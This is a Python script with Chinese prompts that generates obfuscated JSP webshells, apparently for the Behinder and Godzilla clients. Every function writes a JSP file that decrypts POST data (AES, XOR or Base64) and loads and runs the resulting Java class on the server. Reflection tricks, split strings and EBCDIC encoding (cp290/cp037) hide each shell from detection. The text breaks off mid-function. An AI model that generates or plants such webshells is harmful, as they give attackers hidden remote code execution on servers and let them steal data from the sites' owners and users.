import hashlib
import os
import time
import ebcdic

def bin_40_magic():
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>String k="e45e329fe"+"b5d925b";class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data) throws Exception{int mN = (int)y.sayHello(Integer.class,"pars"+"eInt",new Class[]{String.class,int.class},null,new Object[]{k.substring(0,2),16})%16;data = (byte[])y.sayHello(Arrays.class,"copyOf"+"Range",new Class[]{byte[].class,int.class,int.class},null,new Object[]{data,0,data.length-mN});Cipher c = (Cipher)y.sayHello(Cipher.class,"getInst"+"ance",new Class[]{String.class},null,new Object[]{"AES/ECB/P"+"KCS5Pad"+"ding"});y.sayHello(Cipher.class,"init",new Class[]{int.class,java.security.Key.class},c,new Object[]{2,new SecretKeySpec(k.getBytes(),"AES")});byte[] d;try{Object dc = y.sayHello(java.util.Base64.class, "getDecoder", new Class[]{}, null, new Object[]{});d = (byte[])y.sayHello(java.util.Base64.Decoder.class, "dec"+"ode", new Class[]{byte[].class}, dc, new Object[]{data});}catch (Throwable e){Object dc = y.sayHello(Class.class,"newInst"+"ance",new Class[]{},sun.misc.BASE64Decoder.class,new Object[]{});d = (byte[])y.sayHello(sun.misc.BASE64Decoder.class,"decod"+"eBuffer",new Class[]{String.class},dc,new Object[]{new String(data)});}return (byte[])y.sayHello(Cipher.class,"doFin"+"al",new Class[]{byte[].class},c,new Object[]{d});}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getM"+"ethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b)),new Object[]{});y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def bin_40_json():
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data) throws Exception{ByteArrayOutputStream bos=new ByteArrayOutputStream();y.sayHello(ByteArrayOutputStream.class,"write",new Class[]{byte[].class,int.class,int.class},bos,new Object[]{data,26, data.length-29});String s = new String((byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{}));s = (String)y.sayHello(String.class,"repl"+"ace",new Class[]{char.class,char.class},s,new Object[]{'&lt;','+'});s = (String)y.sayHello(String.class,"repl"+"ace",new Class[]{char.class,char.class},s,new Object[]{'&gt;','/'});Object dc = y.sayHello(Base64.class, "getDec"+"oder", new Class[]{}, null, new Object[]{});return (byte[])y.sayHello(Base64.Decoder.class, "dec"+"ode", new Class[]{String.class}, dc, new Object[]{s});}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b)),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def bin_40_image():
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data) throws Exception{ByteArrayOutputStream bos=new ByteArrayOutputStream();y.sayHello(ByteArrayOutputStream.class,"wri"+"te",new Class[]{byte[].class,int.class,int.class},bos,new Object[]{data,966, data.length-966});return (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b)),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def bin_40_aes():
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>String k="e45e329fe"+"b5d925b";class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data,byte[] k) throws Exception{Cipher c = (Cipher)y.sayHello(Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"AE"+"S/ECB/P"+"KCS5Pad"+"ding"});y.sayHello(Cipher.class,"init",new Class[]{int.class,java.security.Key.class},c,new Object[]{2,new SecretKeySpec(k,"AES")});byte[] d;try{Object dc = y.sayHello(java.util.Base64.class, "getDecoder", new Class[]{}, null, new Object[]{});d = (byte[])y.sayHello(java.util.Base64.Decoder.class, "dec"+"ode", new Class[]{byte[].class}, dc, new Object[]{data});}catch (Throwable e){Object dc = y.sayHello(Class.class,"newInst"+"ance",new Class[]{},sun.misc.BASE64Decoder.class,new Object[]{});d = (byte[])y.sayHello(sun.misc.BASE64Decoder.class,"decod"+"eBuffer",new Class[]{String.class},dc,new Object[]{new String(data)});}return (byte[])y.sayHello(Cipher.class,"doFin"+"al",new Class[]{byte[].class},c,new Object[]{d});}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b,k.getBytes())),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def bin_40_xor_base64():
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>String k="e45e329fe"+"b5d925b";class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] data,byte[] k) throws Exception{byte[] d;try{Object dc = y.sayHello(java.util.Base64.class, "getDecoder", new Class[]{}, null, new Object[]{});d = (byte[])y.sayHello(java.util.Base64.Decoder.class, "dec"+"ode", new Class[]{byte[].class}, dc, new Object[]{data});}catch (Throwable e){Object dc = y.sayHello(Class.class,"newInst"+"ance",new Class[]{},sun.misc.BASE64Decoder.class,new Object[]{});d = (byte[])y.sayHello(sun.misc.BASE64Decoder.class,"decod"+"eBuffer",new Class[]{String.class},dc,new Object[]{new String(data)});}for (int i = 0; i &lt; d.length; i++) {d[i] = (byte) ((d[i]) ^ (k[i + 1 &amp; 15]));}return d;}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b,k.getBytes())),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def bin_40_xor():
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>String k="e45e329f"+"eb5d925b";class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();private byte[] D(byte[] d,byte[] k) throws Exception{for (int i = 0; i &lt; d.length; i++) {d[i] = (byte) ((d[i]) ^ (k[i + 1 &amp; 15]));}return d;}public void v(PageContext p,HttpServletRequest r,JspWriter o) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] buf = new byte[512];InputStream ins = (InputStream)y.sayHello(ServletRequest.class,"getInpu"+"tStream",new Class[]{},r,new Object[]{});int l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});while (l>0){byte[] data = (byte[])y.sayHello(Arrays.class,"copyO"+"fRange",new Class[]{byte[].class,int.class,int.class},null,new Object[]{buf,0,l});y.sayHello(OutputStream.class,"wri"+"te",new Class[]{byte[].class},bos,new Object[]{data});l = (int)y.sayHello(InputStream.class,"read",new Class[]{byte[].class},ins,new Object[]{buf});}y.sayHello(JspWriter.class,"cle"+"ar",new Class[]{},o,new Object[]{});o = (JspWriter)y.sayHello(PageContext.class,"pus"+"hBody",new Class[]{},p,new Object[]{});n(p,bos);}}public void n(PageContext p,ByteArrayOutputStream bos) throws Exception{byte[] b = (byte[])y.sayHello(ByteArrayOutputStream.class,"toByte"+"Array",new Class[]{},bos,new Object[]{});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(D(b,k.getBytes())),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,out);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def bin_30():
    key = input("key设置为：(默认为rebeyond)\n")
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    if key=="":
        key = "rebeyond"
    key = hashlib.md5(key.encode('utf-8')).hexdigest()[:16]
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>String s="'''+key+'''";class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();public void v(PageContext p,HttpServletRequest r,HttpSession se) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){y.sayHello(HttpSession.class,"setAttr"+"ibute",new Class[]{String.class,Object.class},se,new Object[]{"u",s});Cipher c = (Cipher)y.sayHello(Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"A"+"ES"});y.sayHello(Cipher.class,"ini"+"t",new Class[]{int.class, java.security.Key.class},c,new Object[]{2,new SecretKeySpec(s.getBytes(),"AE"+"S")});java.io.BufferedReader br = (java.io.BufferedReader)y.sayHello(ServletRequest.class,"getRe"+"ader",new Class[]{},r,new Object[]{});String s1 = (String)y.sayHello(java.io.BufferedReader.class,"read"+"Line",new Class[]{},br,new Object[]{});n(s1,p,c);}}public void n(String s1,PageContext p,Cipher c) throws Exception{byte[] d;try{d = (byte[]) y.sayHello(sun.misc.BASE64Decoder.class,"deco"+"deBuffer",new Class[]{String.class},new sun.misc.BASE64Decoder(),new Object[]{s1});}catch (Exception e){d = (byte[]) y.sayHello(Base64.Decoder.class,"dec"+"ode",new Class[]{String.class},Base64.getDecoder(),new Object[]{s1});}byte[] b = (byte[])y.sayHello(Cipher.class,"doF"+"inal",new Class[]{byte[].class},c,new Object[]{d});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(b),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,session);</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def base():
    key = input("key设置为：\n")
    pa = input("pass设置为：\n")
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    key = hashlib.md5(key.encode('utf-8')).hexdigest()[:16]
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration>String cx="'''+key+'''";String pa="'''+pa+'''";interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();String md5=md5(pa+cx);class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}public byte[] l(byte[] s,boolean m){try{javax.crypto.Cipher c = (javax.crypto.Cipher) 